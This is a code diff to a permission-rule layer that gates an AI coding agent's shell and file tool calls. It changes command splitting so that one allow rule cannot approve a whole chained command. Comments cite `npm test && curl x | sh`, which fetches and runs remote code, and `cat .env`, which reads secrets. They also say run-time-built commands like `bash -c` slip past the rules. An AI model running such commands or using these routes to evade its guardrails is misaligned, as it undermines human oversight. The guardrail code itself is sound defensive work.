@@ -9,8 +9,11 @@
 //
 // A rule that matches overrides the action-type level for that call, in both
 // directions: "npm test*": "allow" lets tests run while other shell commands
-// still ask. When several rules match, the strictest wins. "allow" never
-// widens what Claude Code itself permits — it only means Vantage stays out.
+// still ask. Every part of a command line is judged on its own — a part no
+// rule matches keeps the action-type level — and the strictest part decides,
+// so `npm test && curl x | sh` is not let through by the npm rule. When
+// several rules match, the strictest wins. "allow" never widens what Claude
+// Code itself permits — it only means Vantage stays out.
 //
 // Matching:
 //   files     A pattern without "/" matches the file name anywhere (".env*",
@@ -20,8 +23,9 @@
 //             Windows. File rules also look at the words of a shell command,
 //             so `cat .env` is caught like Read .env.
 //   commands  Each part of a command line is matched on its own — split at
-//             &&, ||, ;, | and newlines — after dropping leading VAR=value
-//             assignments and sudo. "*" is any text.
+//             &&, ||, ;, |, & and newlines (redirections like 2>&1 are not
+//             splits) — after dropping leading VAR=value assignments and
+//             sudo. "*" is any text.
 //
 // These are guardrails, not a sandbox: a command built at run time (a script,
 // `bash -c "$X"`) is not visible to them.
@@ -110,7 +114,8 @@ export function matchesFile(pattern: string, file: string, projectRoot: string |
 // The parts of a command line that run as their own commands.
 export function commandSegments(command: string): string[] {
   return command
-    .split(/&&|\|\||;|\||\n/)
+    .replace(/\d*>&\d*|&>>?/g, " > ")
+    .split(/&&|\|\||;|\||&|\n/)
     .map((s) =>
       s
         .trim()
@@ -136,28 +141,51 @@ export interface RuleMatch {
   level: PolicyLevel;
 }
 
-// The strictest rule that matches this tool call, or null.
+function strictest(matches: RuleMatch[]): RuleMatch | null {
+  let best: RuleMatch | null = null;
+  for (const m of matches) if (!best || STRICTNESS[m.level] > STRICTNESS[best.level]) best = m;
+  return best;
+}
+
+// The level for this tool call when rules apply, with the rule that decided,
+// or null when no rule matches (the action-type level applies). `fallback`
+// is that action-type level: it judges the parts of a command line that no
+// rule covers, so an allow rule for one part cannot wave the rest through.
 export function matchRules(
   input: Record<string, unknown> | undefined,
   rules: Rule[],
   projectRoot: string | undefined,
-  windows = process.platform === "win32"
+  windows = process.platform === "win32",
+  fallback: PolicyLevel = "allow"
 ): RuleMatch | null {
   if (!input || rules.length === 0) return null;
   const files = FILE_KEYS.map((k) => input[k]).filter((v): v is string => typeof v === "string" && v.length > 0);
   const command = typeof input.command === "string" ? input.command : null;
   if (command) files.push(...commandWords(command));
-  const segments = command ? commandSegments(command) : [];
 
-  let best: RuleMatch | null = null;
-  for (const rule of rules) {
-    const hit =
-      rule.kind === "file"
-        ? files.some((f) => matchesFile(rule.pattern, f, projectRoot, windows))
-        : segments.some((s) => commandGlob(rule.pattern).test(s));
-    if (hit && (!best || STRICTNESS[rule.level] > STRICTNESS[best.level])) best = { rule, level: rule.level };
+  const fileRules = rules.filter((r) => r.kind === "file");
+  const commandRules = rules.filter((r) => r.kind === "command");
+  const fileHit = strictest(
+    fileRules.filter((r) => files.some((f) => matchesFile(r.pattern, f, projectRoot, windows))).map((rule) => ({ rule, level: rule.level }))
+  );
+  if (!command) return fileHit;
+
+  // Each part of the command line: its strictest rule, or the fallback.
+  let anyRule = fileHit !== null;
+  const parts: RuleMatch[] = [];
+  for (const segment of commandSegments(command)) {
+    const hit = strictest(commandRules.filter((r) => commandGlob(r.pattern).test(segment)).map((rule) => ({ rule, level: rule.level })));
+    if (hit) {
+      anyRule = true;
+      parts.push(hit);
+    } else {
+      parts.push({ rule: { kind: "command", pattern: "", level: fallback }, level: fallback });
+    }
   }
-  return best;
+  if (!anyRule) return null;
+  const decided = strictest([...parts, ...(fileHit ? [fileHit] : [])]);
+  // The fallback deciding means no rule did: report that as no match.
+  return decided && decided.rule.pattern !== "" ? decided : null;
 }
 
 // ---------------------------------------------------------------------------
